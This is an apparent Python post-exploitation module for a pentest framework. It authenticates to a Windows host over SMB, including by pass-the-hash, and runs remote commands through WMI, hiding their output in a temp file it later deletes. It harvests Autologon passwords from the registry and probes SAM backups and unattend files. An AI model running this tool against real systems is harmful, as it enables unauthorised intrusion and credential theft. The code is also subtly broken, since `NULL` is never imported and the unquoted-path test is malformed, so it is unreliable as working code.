# scripts/smb/post/privesc_check.py
"""
Privesc Checker remoto — enumera vectores de escalada de privilegios
en el sistema objetivo vía SMB/WMI.

Comprueba:
  - Servicios con rutas sin comillas (Unquoted Service Path)
  - Permisos débiles en servicios (sc sdshow)
  - AlwaysInstallElevated (registro)
  - SeImpersonatePrivilege / SeAssignPrimaryToken (Potato attacks)
  - Tareas programadas modificables
  - DLL hijacking en PATH de sistema
  - Credenciales en registro (Autologon, WinLogon)
  - Credenciales en archivos comunes (unattend.xml, web.config)
  - Usuarios locales en grupo Administrators

Uso:
  python lobera.py smb -t 10.10.10.5 --script=privesc-check -u USER -p PASS
  python lobera.py smb -t 10.10.10.5 --script=privesc-check -u USER -H :HASH --full
"""

from core.output import console, print_result
from core import session_db


REGISTRY_CHECKS = [
    # (hive, key, value, descripción)
    ('HKLM', r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultPassword',
     'Autologon password en registro'),
    ('HKLM', r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultUserName',
     'Autologon username'),
    ('HKLM', r'SOFTWARE\Policies\Microsoft\Windows\Installer', 'AlwaysInstallElevated',
     'AlwaysInstallElevated (HKLM)'),
    ('HKCU', r'SOFTWARE\Policies\Microsoft\Windows\Installer', 'AlwaysInstallElevated',
     'AlwaysInstallElevated (HKCU)'),
]

SENSITIVE_FILES = [
    r'C:\Windows\Panther\Unattend.xml',
    r'C:\Windows\Panther\Unattended.xml',
    r'C:\Windows\system32\sysprep\sysprep.xml',
    r'C:\Windows\system32\sysprep\Unattend.xml',
    r'C:\inetpub\wwwroot\web.config',
    r'C:\Windows\repair\SAM',
    r'C:\Windows\repair\system',
]

PRIVS_OF_INTEREST = [
    'SeImpersonatePrivilege',     # JuicyPotato / PrintSpoofer
    'SeAssignPrimaryTokenPrivilege',
    'SeDebugPrivilege',
    'SeTakeOwnershipPrivilege',
    'SeBackupPrivilege',
    'SeRestorePrivilege',
    'SeLoadDriverPrivilege',
]


class Script:
    NAME        = "privesc-check"
    DESCRIPTION = "Enumeración de vectores de escalada de privilegios (local)"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target   = str(self.target.ip)
        user     = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
        password = getattr(args, 'password', '') or (self.creds.password if self.creds else '')
        domain   = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
        hash_    = getattr(args, 'hash',     None)
        full     = getattr(args, 'full',     False)

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        lm_hash = nt_hash = ''
        if hash_:
            parts = hash_.split(':')
            lm_hash = parts[0] if len(parts) > 1 else 'aad3b435b51404eeaad3b435b51404ee'
            nt_hash = parts[-1]

        console.print(f"  [bold]Privesc Check[/bold] → {target}  usuario: {domain}\\{user}")

        try:
            from impacket.smbconnection import SMBConnection
            smb = SMBConnection(target, target, timeout=10)
            if nt_hash:
                smb.login(user, '', domain, lm_hash, nt_hash)
            else:
                smb.login(user, password, domain)
            console.print(f"  [green]✓ Conectado[/green]\n")
        except Exception as e:
            console.print(f"  [red]✗ Error: {e}[/red]")
            return

        findings = []

        # ── Ejecutar comandos remotos ──────────────────────────────────────
        def exec_cmd(cmd: str) -> str:
            """Ejecuta comando vía WMI y devuelve output"""
            try:
                from impacket.dcerpc.v5.dcom.wmi import WBEM_FLAG_FORWARD_ONLY
                from impacket.dcerpc.v5.dcomrt import DCOMConnection
                from impacket.dcerpc.v5.dcom import wmi

                dcom = DCOMConnection(target, user, password if not nt_hash else '',
                                      domain, lm_hash, nt_hash, oxidResolver=True)
                iInterface = dcom.CoCreateInstanceEx(
                    wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)

                iWbemLevel1Login.RemRelease()

                win32Process, _ = iWbemServices.GetObject('Win32_Process')
                obj, pid = win32Process.Create(
                    f'cmd.exe /c {cmd} > C:\\Windows\\Temp\\.lob_out 2>&1',
                    'C:\\', None)
                import time; time.sleep(2)

                # Leer output via SMB
                try:
                    f = smb.openFile(smb.connectTree('C$'), 'Windows\\Temp\\.lob_out')
                    data = b''
                    while True:
                        chunk = smb.readFile(smb.connectTree('C$'), f, len(data))
                        if not chunk: break
                        data += chunk
                    smb.closeFile(smb.connectTree('C$'), f)
                    smb.deleteFile('C$', 'Windows\\Temp\\.lob_out')
                    return data.decode('utf-8', errors='replace')
                except Exception:
                    return ''
            except Exception:
                return ''

        # ── Checks ────────────────────────────────────────────────────────

        console.print("  [bold]1. Unquoted Service Paths[/bold]")
        out = exec_cmd(r'wmic service get name,startmode,pathname | findstr /i "auto" | findstr /iv "c:\windows"')
        if out:
            for line in out.strip().splitlines():
                line = line.strip()
                if line and ' ' in line.split('"')[0] if '"' not in line else False:
                    console.print(f"    [red]⚠ {line}[/red]")
                    findings.append({"type": "unquoted_service", "detail": line})
        else:
            console.print("    [dim]Sin resultados o WMI no disponible[/dim]")

        console.print("\n  [bold]2. AlwaysInstallElevated[/bold]")
        for hive, key, val, desc in REGISTRY_CHECKS:
            if 'InstallElevated' not in desc:
                continue
            out = exec_cmd(f'reg query "{hive}\\{key}" /v {val} 2>nul')
            if out and '0x1' in out.lower():
                console.print(f"    [bold red]⚠ {desc} ACTIVO[/bold red]")
                findings.append({"type": "always_install_elevated", "hive": hive})
            else:
                console.print(f"    [green]✓ {desc}: no activo[/green]")

        console.print("\n  [bold]3. Credenciales en registro[/bold]")
        for hive, key, val, desc in REGISTRY_CHECKS:
            if 'Autologon' not in desc and 'username' not in desc.lower():
                continue
            out = exec_cmd(f'reg query "{hive}\\{key}" /v {val} 2>nul')
            if out and 'REG_SZ' in out:
                value = out.split('REG_SZ')[-1].strip()
                if value:
                    console.print(f"    [bold red]⚠ {desc}: {value}[/bold red]")
                    findings.append({"type": "registry_cred", "desc": desc, "value": value})

        console.print("\n  [bold]4. Privilegios del usuario actual[/bold]")
        out = exec_cmd('whoami /priv')
        if out:
            for priv in PRIVS_OF_INTEREST:
                if priv.lower() in out.lower() and 'enabled' in out.lower():
                    console.print(f"    [bold red]⚠ {priv} — Enabled[/bold red]")
                    findings.append({"type": "privilege", "priv": priv})
                elif priv.lower() in out.lower():
                    console.print(f"    [yellow]~ {priv} — Disabled (pero presente)[/yellow]")

        console.print("\n  [bold]5. Archivos sensibles accesibles[/bold]")
        for fpath in SENSITIVE_FILES:
            share = 'C$'
            rel   = fpath[3:].replace('/', '\\')
            try:
                f = smb.openFile(smb.connectTree(share), rel)
                smb.closeFile(smb.connectTree(share), f)
                console.print(f"    [bold red]⚠ Accesible: {fpath}[/bold red]")
                findings.append({"type": "sensitive_file", "path": fpath})
            except Exception:
                pass

        if full:
            console.print("\n  [bold]6. Tareas programadas modificables[/bold]")
            out = exec_cmd('schtasks /query /fo LIST /v 2>nul | findstr /i "task name\\|run as\\|task to run"')
            if out:
                console.print(f"    [dim]{out[:500]}[/dim]")

        # ── Resumen ────────────────────────────────────────────────────────
        console.print(f"\n  [bold]{'─'*50}[/bold]")
        if findings:
            console.print(f"  [bold red]⚠ {len(findings)} vector(es) de privesc encontrado(s)[/bold red]")
            for f in findings:
                console.print(f"    • {f['type']}: {list(f.values())[1]}")
                session_db.save_finding(category="privesc", data={**f, "target": target})
        else:
            console.print("  [green]No se encontraron vectores de privesc obvios.[/green]")

        try:
            smb.logoff()
        except Exception:
            pass
